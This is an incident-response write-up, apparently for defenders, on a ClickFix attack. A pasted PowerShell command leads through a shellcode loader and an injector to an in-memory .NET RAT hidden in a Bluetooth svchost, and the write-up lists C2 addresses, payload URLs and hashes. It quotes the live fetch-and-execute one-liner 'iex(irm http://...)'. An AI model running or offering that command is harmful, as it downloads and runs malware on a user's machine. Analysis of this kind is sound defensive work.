---
id: clickfix-clr-rat
title: "ClickFix to CLR RAT Delivery Chain"
summary: "A ClickFix PowerShell paste leads to shellcode, a native injector, and an in-memory .NET implant hiding in a Bluetooth svchost."
category: DFIR
date: 2026-10-02
tags: [clickfix, process-injection, rat, delivery-chain, windows, donut, clr]
---

# ClickFix to CLR RAT Delivery Chain

## TL;DR

- ClickFix paste returns a shellcode runner, not the payload
- The shellcode unpacks a native injector, which drops a second binary into a Bluetooth service `svchost`
- The real implant is an in-memory .NET assembly, `sub00`
- Post-exploitation: screenshots, Edge credential access, more in-memory .NET loads

```
CLASS   : RAT delivery / process injection
VECTOR  : ClickFix (PowerShell paste)
IMPLANT : CLR assembly sub00, injected into svchost
C2      : 91.92.243.161:3038
IMPACT  : Screenshots, Edge credential access, further CLR loads
```

## Attack Chain

```
PowerShell paste: iex(irm http://158.94.211.77/?sid=<random>)
  → shellcode runner pulls /s_enterprise
  → Donut-style loader → mod_s_enterprise (native injector)
  → fetches enterprise/student_s.bin
  → injects into svchost -k BthAppGroup (BluetoothUserService)
  → CLR assembly sub00 → C2
```

## What happened

The user pasted `iex(irm http://158.94.211.77/?sid=<random>)`. What comes back is a stock shellcode runner: download `s_enterprise` from a second IP, allocate executable memory, run it. Nothing interesting in the script itself.

`s_enterprise` has no PE header and looks like noise to `file` and FLOSS, so I opened it in Ghidra. It's a loader that unpacks a native payload, Donut-class behavior, though I didn't recover enough to say which builder made it. The payload is `mod_s_enterprise`, a MinGW-built injector that downloads `enterprise/student_s.bin` and targets `svchost.exe`.

EDR telemetry shows the rest. An in-memory CLR assembly appears, then a remote thread is created in `svchost.exe -k BthAppGroup -p -s BluetoothUserService`, and a second assembly named `sub00` loads in there. `sub00` matches the one string sitting in `student_s.bin`, so I'm confident that's the link, though I never confirmed how the binary hosts the CLR. The Bluetooth service looks like a convenient hiding spot rather than anything purposeful.

From the injected process: screenshots, Edge DPAPI access, and more CLR assemblies loaded with no disk writes. Sandbox detonation of `student_s.bin` reached `91.92.243.161:3038` with about 28MB outbound. That's suspicious, but I wouldn't call it confirmed exfil without network telemetry showing direction and content.

## IOCs

### Network

```
158.94.211.77                                   ClickFix / Stage 1
158.94.211.76                                   Payload host
http://158.94.211.76/s_enterprise               Donut shellcode
http://158.94.211.76/enterprise/student_s.bin   Secondary PE
91.92.243.161:3038                              C2
```

### Hashes

```
mod_s_enterprise  4d9c5a3c56f5747ed6ae519c11e99bb56edfccb324ddf63f7ce8a7ada340485a
student_s.bin     53d83e993c624528043881ff9758ef606d77487e682230714c510b272d68b7db
```

### Host

```
CLR assemblies (in memory): jq5ksud0, sub00
Injection target: svchost.exe -k BthAppGroup -p -s BluetoothUserService
student_s.bin compiled: 2026-07-08 23:09:10 UTC
mod_s_enterprise MD5:  881d500742127a52ae5a52a29de66ffb
mod_s_enterprise SHA1: c4b150ad42a10b514a643357c8d7f9a9105f3ba1
```
